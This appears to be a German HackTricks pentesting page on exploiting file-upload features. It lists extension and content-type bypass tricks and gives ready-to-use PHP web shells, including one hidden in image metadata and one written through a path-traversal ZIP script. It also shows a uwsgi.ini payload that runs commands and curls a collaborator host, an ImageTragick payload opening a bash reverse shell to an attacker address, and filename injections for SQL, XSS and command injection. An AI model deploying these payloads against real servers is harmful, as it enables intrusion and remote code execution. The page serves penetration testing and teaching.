# Datei-Upload

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Methodik zum Datei-Upload

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, .php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehen von Dateierweiterungsprüfungen

1. Falls zutreffend, überprüfe die **vorherigen Erweiterungen.** Teste sie auch mit **Großbuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _Prüfe **das Hinzufügen einer gültigen Erweiterung vor** der Ausführungserweiterung (verwende auch die vorherigen Erweiterungen):_
- _file.png.php_
- _file.png.Php5_
3. Versuche, **Sonderzeichen am Ende** hinzuzufügen. Du könntest Burp benutzen, um alle **ascii** und **Unicode** Zeichen zu **bruteforcen**. (_Hinweis: Du kannst auch versuchen, die **vorher** genannten **Erweiterungen** zu verwenden_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuche, den Schutz zu umgehen, indem du den **Extension-Parser** auf Serverseite täuschst — z. B. durch **Verdoppeln** der **Erweiterung** oder **Einfügen von Junk-Daten** (**null bytes**) zwischen den Erweiterungen. _Du kannst auch die **vorherigen Erweiterungen** nutzen, um ein besseres Payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Füge **weitere Erweiterungs-Schichten** zu den vorherigen Checks hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuche, die **Ausführungserweiterung vor der gültigen Erweiterung** zu platzieren und hoffe auf eine Fehlkonfiguration des Servers. (nützlich, um Apache-Fehlkonfigurationen auszunutzen, bei denen alles mit der Erweiterung **.php**, aber **nicht unbedingt endend auf .php**, Code ausführt):
- _ex: file.php.png_
7. Verwendung von **NTFS alternate data stream (ADS)** unter **Windows**. In diesem Fall wird ein Doppelpunkt ":" nach einer verbotenen Erweiterung und vor einer erlaubten eingefügt. Dadurch wird auf dem Server eine **leere Datei mit der verbotenen Erweiterung** erstellt (z. B. "file.asax:.jpg”). Diese Datei könnte später mit anderen Techniken bearbeitet werden, z. B. über ihren Short Filename. Das Muster "**::$data**” kann auch verwendet werden, um nicht-leere Dateien zu erstellen. Daher kann das Hinzufügen eines Punktes nach diesem Muster hilfreich sein, um weitere Einschränkungen zu umgehen (z. B. "file.asp::$data.”)
8. Versuche, die Dateinamenlimits zu durchbrechen. Die gültige Erweiterung wird abgeschnitten, und das bösartige PHP bleibt übrig. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, Magic Number, Kompression & Größenänderung umgehen

- Umgehe **Content-Type**-Prüfungen, indem du den **Wert** des **Content-Type** **Headers** auf setzt: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Umgehe die **magic number**-Prüfung, indem du am Anfang der Datei die **Bytes eines echten Bildes** einfügst (verwirrt das _file_-Kommando). Oder platziere die Shell in den **Metadaten**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder du könntest das Payload auch direkt in ein Bild einfügen:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Falls **Kompressionen auf dein Bild angewendet** werden, z. B. durch Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die vorherigen Techniken nicht nützlich. Du kannst jedoch den **PLTE chunk** [**Technik hier definiert**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die Webseite könnte das **Bild außerdem skalieren**, z. B. mit den PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled`. Du könntest jedoch den **IDAT chunk** [**Technik hier definiert**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Eine weitere Technik, um ein Payload zu erstellen, das eine Bildskalierung übersteht (z. B. die PHP-GD-Funktion `thumbnailImage`), ist die Verwendung des **tEXt chunk** [**hier definierte Technik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), um Text einzufügen, der die **Kompression überlebt**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Weitere Tricks zum Prüfen

- Finde eine Verwundbarkeit, um die bereits hochgeladene Datei umzubenennen (um die Erweiterung zu ändern).
- Finde eine **Local File Inclusion**-Vulnerability, um den Backdoor auszuführen.
- **Mögliche Informationsoffenlegung**:
1. Lade die **gleiche Datei** **mehrfach** (und gleichzeitig) mit **dem selben Namen** hoch.
2. Lade eine Datei mit dem **Namen** einer **bereits existierenden Datei** oder eines **Ordners** hoch.
3. Lade eine Datei mit dem Namen `"."`, `".."` oder `"..."` hoch. Zum Beispiel erzeugt in Apache unter **Windows**, wenn die Anwendung die hochgeladenen Dateien im Verzeichnis "/www/uploads/" speichert, der Dateiname "." eine Datei namens "uploads" im Verzeichnis "/www/".
4. Lade eine Datei hoch, die sich nicht leicht löschen lässt, z. B. **"...:.jpg"** in **NTFS**. (Windows)
5. Lade eine Datei auf **Windows** mit **ungültigen Zeichen** wie `|<>*?”` im Namen hoch. (Windows)
6. Lade eine Datei auf **Windows** mit reservierten (**verbotenen**) Namen wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9 hoch.
- Versuche außerdem, eine ausführbare Datei (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, die beim versehentlichen Öffnen durch ein Opfer Code ausführt.

### Spezielle Erweiterungs-Tricks

Wenn du Dateien auf einen **PHP server** hochladen willst, [sieh dir den **.htaccess**-Trick an, um Code auszuführen](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Wenn du Dateien auf einen **ASP server** hochladen willst, [sieh dir den **.config**-Trick an, um Code auszuführen](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` Dateien sind wie `.jar` für Java, aber für PHP, und können **wie eine PHP-Datei verwendet werden** (mit php ausgeführt oder innerhalb eines Scripts inkludiert werden...).

Die `.inc` Erweiterung wird manchmal für PHP-Dateien verwendet, die nur zum **Importieren von Dateien** dienen; daher könnte es sein, dass diese Erweiterung an einer Stelle **zur Ausführung erlaubt** wurde.

## **Jetty RCE**

Wenn du eine XML-Datei auf einen Jetty-Server hochladen kannst, kannst du [RCE erhalten, weil **neue \*.xml und \*.war automatisch verarbeitet werden**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Wie im folgenden Bild erwähnt, lade die XML-Datei nach `$JETTY_BASE/webapps/` hoch und erwarte die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Für eine detaillierte Untersuchung dieser Verwundbarkeit sieh dir die Originalrecherche an: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities können auf uWSGI-Servern ausgenutzt werden, wenn man die Möglichkeit hat, die `.ini`-Konfigurationsdatei zu verändern. uWSGI-Konfigurationsdateien verwenden eine spezielle Syntax, die "magische" Variablen, Platzhalter und Operatoren unterstützt. Insbesondere der '@' Operator, eingesetzt als `@(filename)`, ist dafür gedacht, den Inhalt einer Datei einzubinden. Unter den verschiedenen in uWSGI unterstützten Schemes ist das "exec" scheme besonders mächtig, da es das Lesen von Daten aus der Standardausgabe eines Prozesses erlaubt. Diese Funktion kann manipuliert werden, um Remote Command Execution oder Arbitrary File Write/Read zu ermöglichen, wenn eine `.ini`-Konfigurationsdatei verarbeitet wird.

Betrachte das folgende Beispiel einer bösartigen `uwsgi.ini`-Datei, das verschiedene schemes zeigt:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung des payloads erfolgt während des Parsings der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (möglicherweise nach einem Crash oder aufgrund eines Denial of Service-Angriffs) oder die Datei muss für auto-reload konfiguriert sein. Die auto-reload-Funktion, falls aktiviert, lädt die Datei in festgelegten Intervallen neu, wenn Änderungen erkannt werden.

Es ist wichtig, die lockere Art der Verarbeitung von uWSGI-Konfigurationsdateien zu verstehen. Konkret kann der besprochene payload in eine Binärdatei (z. B. ein Bild oder PDF) eingefügt werden, was die Angriffsfläche weiter vergrößert.

## **wget File Upload/SSRF Trick**

In einigen Fällen stellt man fest, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen**, und man die **URL** angeben kann. In diesen Fällen prüft der Code möglicherweise, ob die Extension der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. Allerdings lässt sich **dieser Check umgehen.**\
Die **maximale** Länge eines **Dateinamens** in **linux** beträgt **255**, jedoch kürzt **wget** die Dateinamen auf **236** Zeichen. Du kannst eine Datei namens **"A"\*232+".php"+".gif"** herunterladen; dieser Dateiname wird die **Prüfung umgehen** (in diesem Beispiel ist **".gif"** eine **gültige** Erweiterung), aber `wget` wird die Datei in **"A"\*232+".php"** umbenennen.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachte, dass **eine andere Option**, die dir vielleicht einfällt, um diese Prüfung zu umgehen, darin besteht, den **HTTP server so umzuleiten, dass er auf eine andere Datei zeigt**, sodass die ursprüngliche URL die Prüfung umgeht und wget dann die umgeleitete Datei mit dem neuen Namen herunterlädt. Das **funktioniert nicht**, **es sei denn** wget wird mit dem **Parameter** `--trust-server-names` verwendet, weil **wget die umgeleitete Seite mit dem Namen der Datei aus der ursprünglichen URL herunterladen wird**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ist ein mächtiges Tool, das entwickelt wurde, um Pentesters und Bug Hunters beim Testen von file upload-Mechanismen zu unterstützen. Es nutzt verschiedene bug bounty-Techniken, um den Prozess der Identifizierung und Ausnutzung von Schwachstellen zu vereinfachen und so gründliche Bewertungen von Webanwendungen zu ermöglichen.

### Corrupting upload indices with snprintf quirks (historical)

Einige veraltete upload handler, die `snprintf()` oder ähnliches verwenden, um multi-file arrays aus einem single-file upload zu bauen, können dazu gebracht werden, die `_FILES`-Struktur zu fälschen. Aufgrund von Inkonsistenzen und Abschneidungen im Verhalten von `snprintf()` kann ein sorgfältig gestalteter single upload auf der Serverseite als mehrere indizierte Dateien erscheinen und Logik verwirren, die eine strikte Form annimmt (z. B. als multi-file upload behandelt und unsichere Pfade wählt). Obwohl heute nischenhaft, taucht dieses „index corruption“-Muster gelegentlich in CTFs und älteren Codebasen wieder auf.

## From File upload to other vulnerabilities

- Setze **filename** auf `../../../tmp/lol.png` und versuche, einen **path traversal** zu erreichen
- Setze **filename** auf `sleep(10)-- -.jpg` und du könntest eine **SQL injection** erreichen
- Setze **filename** auf `<svg onload=alert(document.domain)>` um ein XSS zu erreichen
- Setze **filename** auf `; sleep 10;` um einige command injection-Fälle zu testen (mehr [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probiere **verschiedene svg payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Wenn du dem web server mitteilen kannst, ein image von einer URL zu holen, könntest du versuchen, ein [SSRF](../ssrf-server-side-request-forgery/index.html) auszunutzen. Wenn dieses **image** an einem **öffentlichen** Ort gespeichert wird, könntest du auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und **Informationen jedes Besuchers stehlen**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Speziell gestaltete PDFs für XSS: Die [folgende Seite zeigt, wie man **PDF-Daten injiziert, um JS-Ausführung zu erhalten**](../xss-cross-site-scripting/pdf-injection.md). Wenn du PDFs uploaden kannst, könntest du ein PDF vorbereiten, das beliebiges JS gemäß den gegebenen Anweisungen ausführt.
- Upload des \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) Inhalts, um zu prüfen, ob der Server ein **antivirus** hat
- Prüfe, ob es eine **Größenbeschränkung** beim Upload von Dateien gibt

Hier ist eine Top-10-Liste von Dingen, die du durch Upload erreichen kannst (von [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Siehe [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) für andere Dateitypen.

## Zip/Tar File Automatically decompressed Upload

Wenn du eine ZIP hochladen kannst, die auf dem Server dekomprimiert wird, kannst du zwei Dinge tun:

### Symlink

Upload eines Archives, das soft links zu anderen Dateien enthält; beim Zugriff auf die dekomprimierten Dateien greifst du auf die verlinkten Dateien zu:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### In verschiedene Ordner entpacken

Die unerwartete Erstellung von Dateien in Verzeichnissen während des Dekomprimierens ist ein erhebliches Problem. Trotz der anfänglichen Annahme, dass diese Konfiguration gegen OS-level command execution durch malicious file uploads schützen könnte, können die hierarchische Kompressionsunterstützung und die directory traversal-Fähigkeiten des ZIP archive format ausgenutzt werden. Dadurch können Angreifer Einschränkungen umgehen und aus sicheren upload directories ausbrechen, indem sie die decompression functionality der angegriffenen Anwendung manipulieren.

Ein automatisierter Exploit zum Erstellen solcher Dateien ist verfügbar unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Das Tool kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Außerdem ist der **symlink trick with evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzugreifen, sollte ein Symlink zu dieser Datei auf Ihrem System erstellt werden. Dadurch treten während der Ausführung von evilarc keine Fehler auf.

Nachfolgend ein Beispiel für Python-Code, der verwendet wird, um eine bösartige ZIP-Datei zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Komprimierung zum file spraying missbrauchen**

Für weitere Details **siehe den Originalpost unter**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Erstellen einer PHP-Shell**: PHP-Code wird geschrieben, um Befehle auszuführen, die über die `$_REQUEST`-Variable übergeben werden.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying und Erstellung eines komprimierten Archivs**: Mehrere Dateien werden erstellt und ein zip-Archiv wird zusammengestellt, das diese Dateien enthält.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Änderung mit Hex-Editor oder vi**: Die Namen der Dateien im Zip werden mit vi oder einem Hex-Editor geändert, wobei "xxA" in "../" geändert wird, um Verzeichnisse zu traversieren.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Lade diesen Inhalt mit einer Bild-Dateiendung hoch, um die vulnerability auszunutzen **(ImageMagick, 7.0.1-1)** (aus dem [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP Shell in PNG

Das Einbetten einer PHP Shell in den IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungs-Operationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` von PHP-GD sind in diesem Zusammenhang besonders relevant, da sie häufig zum Verkleinern bzw. Resampling von Bildern verwendet werden. Dass die eingebettete PHP Shell von diesen Operationen unberührt bleiben kann, ist für bestimmte Anwendungsfälle ein deutlicher Vorteil.

Eine detaillierte Untersuchung dieser Technik, einschließlich Methodik und möglicher Anwendungen, findet sich im folgenden Artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verständnis des Prozesses und seiner Implikationen.

Mehr Informationen unter: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files dienen im Bereich der Cybersicherheit als Chamäleons, die gleichzeitig in mehreren Dateiformaten gültig sein können. Ein interessantes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien beschränken sich nicht auf dieses Paar; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls möglich.

Der Hauptnutzen von polyglot files liegt in ihrer Fähigkeit, Sicherheitsmaßnahmen zu umgehen, die Dateien nach Typ filtern. Gängige Praxis in vielen Anwendungen ist es, nur bestimmte Dateitypen zum Hochladen zuzulassen — etwa JPEG, GIF oder DOC — um das Risiko durch potenziell gefährliche Formate (z. B. JS, PHP oder Phar) zu verringern. Ein Polyglot kann jedoch, da er die strukturellen Kriterien mehrerer Dateitypen erfüllt, diese Beschränkungen unauffällig umgehen.

Trotz ihrer Anpassungsfähigkeit stoßen Polyglots auf Einschränkungen. Zum Beispiel kann ein Polyglot zwar gleichzeitig eine PHAR-Datei (PHp ARchive) und ein JPEG darstellen, der Erfolg des Uploads hängt jedoch von den Richtlinien der Plattform bezüglich Dateiendungen ab. Wenn das System strikte Vorgaben für erlaubte Extensions hat, reicht die rein strukturelle Dualität eines Polyglot möglicherweise nicht aus, um den Upload sicherzustellen.

Mehr Informationen unter: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Wie man Dateityp-Erkennungen umgeht, indem man eine gültige JSON-Datei hochlädt, selbst wenn dies nicht erlaubt ist, indem man sie als PDF fälscht (Techniken aus **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solange die `%PDF` magic bytes in den ersten 1024 bytes sind, ist es valid (get example from post)
- **`pdflib` library**: Add a fake PDF format inside a filed of the JSON so the library thinks it’s a pdf (get example from post)
- **`file` binary**: It can read up to 1048576 bytes from a file. Just create a JSON bigger than that so it cannot parse the content as a json and then inside the JSON put the initial part of a real PDF and it’ll think it’s a PDF

## Referenzen

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
